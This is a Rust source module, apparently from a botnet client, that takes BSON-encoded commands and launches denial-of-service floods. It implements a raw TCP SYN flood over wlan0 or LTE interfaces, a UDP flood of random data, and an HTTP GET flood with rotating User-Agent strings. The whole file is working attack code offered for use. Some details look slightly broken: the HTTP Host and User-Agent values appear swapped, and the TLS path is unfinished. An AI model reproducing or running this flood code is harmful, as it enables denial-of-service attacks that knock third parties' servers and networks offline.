
pub mod flood {
    use std::io::{Write};
    use std::net::{Ipv4Addr, TcpStream, UdpSocket};
    use std::thread;
    use std::time::{SystemTime};
    use bson::RawDocumentBuf;
    use pnet::datalink;
    use pnet::util::MacAddr;
    use pnet_datalink::{Channel, NetworkInterface};
    use rand::RngCore;
    use crate::communication::ddos_frequency::{L4, L4_TCP_SIG, L4_UDP_SIG, L7_HTTP, L7_HTTP_SIG};
    use crate::ddos::flood;
    use crate::resolv::dns;
    use crate::sys::system::*;
    use crate::tcp::syn;
    pub fn match_and_launch(flood_launch_code: u32, buf: &[u8; 1024], n: usize) {
        match flood_launch_code {
            L4_TCP_SIG => { // TCP L4 DDOS
                let l4_tcp: L4 = bson::from_document(
                    RawDocumentBuf::from_bytes(
                        buf[0..n].to_vec()
                    ).unwrap().to_document().unwrap()
                ).unwrap();
                thread::spawn(
                    move || {
                        flood::l4_tcp (
                            l4_tcp.host, l4_tcp.port, l4_tcp.duration
                        )
                    }
                );
            }
            L4_UDP_SIG => { // UDP L4 DDOS
                let l4_udp: L4 = bson::from_document(
                    RawDocumentBuf::from_bytes(
                        buf[0..n].to_vec()
                    ).unwrap().to_document().unwrap()
                ).unwrap();
                thread::spawn(
                    move || {
                        flood::l4_udp (
                            l4_udp.host, l4_udp.port, l4_udp.duration
                        )
                    }
                );
            }
            L7_HTTP_SIG => { // HTTP L7 DDOS
                let l7_http: L7_HTTP = bson::from_document(
                    RawDocumentBuf::from_bytes(
                        buf[0..n].to_vec()
                    ).unwrap().to_document().unwrap()
                ).unwrap();
                thread::spawn(
                    move || {
                        flood::l7_http (
                            l7_http.domain, l7_http.port, l7_http.duration
                        )
                    }
                );
            }
            _ => ()
        }
    }
    pub fn l4_tcp(host: String, port: u32, duration: u32) {

        let interface_name = match interface_is_connected_internet("wlan0")
        {
            true => "wlan0",
            false => "rmnet0" // LTE
        };
        let gateway_mac = match read_internal_routing_table(interface_name, 1) { // 2
            Some(gateway_ip) => {
                read_internal_arp_table(interface_name, gateway_ip).unwrap() // behind NAT
            }
            None => {
                match read_internal_routing_table(interface_name, 254) {
                    Some(gateway_ip) => {
                        read_internal_arp_table(interface_name, gateway_ip).unwrap() // behind NAT
                    }
                    None => MacAddr::new(0xff, 0xff, 0xff, 0xff, 0xff, 0xff)
                }
            }
        };

        let now = SystemTime::now();

        let interface_names_match =
            |interface: &NetworkInterface| interface.name == interface_name;

        let interfaces = datalink::interfaces();
        let interface = interfaces.into_iter()
            .filter(interface_names_match)
            .next()
            .unwrap();

        let mut interface_ip: Option<Ipv4Addr> = None;
        for network in interface.ips.clone().into_iter() {
            if network.is_ipv4() {
                interface_ip = Some(network.ip().to_string().parse().unwrap());
            }
        }

        match interface_ip {
            Some(ip) => {
                interface_ip = Some(ip);
                if let Some(ref mut interface_ip) = interface_ip {
                    let partial_packet: syn::PartialTCPPacketData = syn::PartialTCPPacketData {
                        destination_ip: host.parse().unwrap(),
                        interface_ip: *interface_ip,
                        interface_mac: &interface.mac.unwrap(),
                        interface_name: &interface.name,
                    };
                    let (mut tx, rx) = match pnet_datalink::channel(&interface, Default::default()) {
                        Ok(Channel::Ethernet(tx, rx)) => (tx, rx),
                        _ => {
                            std::process::exit(-1);
                        }
                    };
                    loop {
                        match now.elapsed() {
                            Ok(elapsed) => {
                                if elapsed.as_secs() == duration as u64 {
                                    break;
                                }
                            }
                            Err(_) => {
                                panic!();
                            }
                        }
                        tx.build_and_send(1, 66, &mut |packet: &mut [u8]| {
                            syn::build_tcp_syn_packet(&partial_packet, packet, port, gateway_mac);
                        });
                    }


                }
            }
            _ => {
                std::process::exit(-1);
            }
        }
    }
    pub fn l4_udp(host: String, port: u32, duration: u32) {
        let now = SystemTime::now();
        let socket = UdpSocket::bind(
            format!(
                "{}:{}", Ipv4Addr::UNSPECIFIED.to_string(), "0"
            )
        ).unwrap();
        socket.connect(
            format!("{}:{}", host.to_string(), port)
        ).unwrap();
        loop {
            match now.elapsed() {
                Ok(elapsed) => {
                    if elapsed.as_secs() == duration as u64 {
                        break;
                    }
                }
                Err(_) => {
                    panic!();
                }
            }
            let mut data = [0u8; 1024];
            rand::thread_rng().fill_bytes(&mut data);
            socket.send(&data).unwrap();
        }
    }

    pub fn l7_http(domain: String, port: u32, duration: u32) {
        let host = dns::a_record(&domain.as_str());
        println!("{:#?}", host);
        let now = SystemTime::now();
        loop {
            match now.elapsed() {
                Ok(elapsed) => {
                    if elapsed.as_secs() == duration as u64 {
                        break;
                    }
                }
                Err(_) => {
                    panic!();
                }
            }
            match port {
                80 => {
                    let mut stream = TcpStream::connect(
                        format!("{}:{}", host.to_string(), port)
                    ).unwrap();
                    let ua = vec![
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.3",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/122.0.0.0 Safari/537.3",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/109.0.0.0 Safari/537.36 Edg/109.0.1518.5",
                        "Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; rv:11.0) like Geck",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.0.0 Safari/537.36 Edg/107.0.1418.2",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.2 Safari/605.1.15",
                        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
                        "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:91.0) Gecko/20100101 Firefox/91.0"
                    ];

                    let mut request = String::from("GET / HTTP/1.1\r\n");
                    let rnd_i = (rand::random::<f32>() * ua.len() as f32).floor() as usize;

                    request.push_str(
                        format!(
                            "Host: {}\r\nUser-Agent: {}\r\n\r\n",
                            ua.get(rnd_i).unwrap(), domain
                        ).as_str()
                    );

                    stream.write(request.as_bytes()).unwrap();
                }
                443 => {
                    // TODO TLS
                }
                _ => {}
            }



        }
    }
}